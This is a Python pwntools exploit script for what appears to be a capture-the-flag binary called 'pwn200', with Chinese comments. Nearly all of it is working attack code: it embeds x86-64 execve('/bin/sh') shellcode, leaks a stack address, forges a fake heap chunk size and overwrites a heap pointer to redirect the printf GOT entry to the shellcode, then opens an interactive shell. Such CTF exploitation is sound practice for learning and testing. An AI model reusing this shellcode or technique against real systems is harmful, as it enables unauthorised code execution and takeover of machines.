#encoding:utf-8
from pwn import *

#r = remote('127.0.0.1', 6666)
p = process("./pwn200")
elf = ELF('./pwn200')
context.log_level='debug'
gdb.attach(p)

printf_got=elf.got['printf']
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

def pwn():
    # gdb.attach(p, "b *0x400991")

    data = shellcode.ljust(46, 'a')
    data += 'bb'
    p.send(data)
    p.recvuntil('bb')
    rbp_addr = p.recvuntil(', w')[:-3]
    rbp_addr = u64(rbp_addr.ljust(8,'\x00'))
    print hex(rbp_addr)

    #fake_addr = rbp_addr - 0x90
    fake_addr = printf_got

    shellcode_addr = rbp_addr - 0x50
    # 输入id伪造下一个堆块的size
    p.recvuntil('id ~~?')
    p.sendline('32')

    p.recvuntil('money~')
    data = p64(shellcode_addr) + p64(0) * 4 + p64(0x41) # 伪造堆块的size
    data = data.ljust(0x38, '\x00') + p64(fake_addr) # 覆盖堆指针
    p.send(data)
    
    p.interactive()

if __name__ == '__main__':
  pwn()

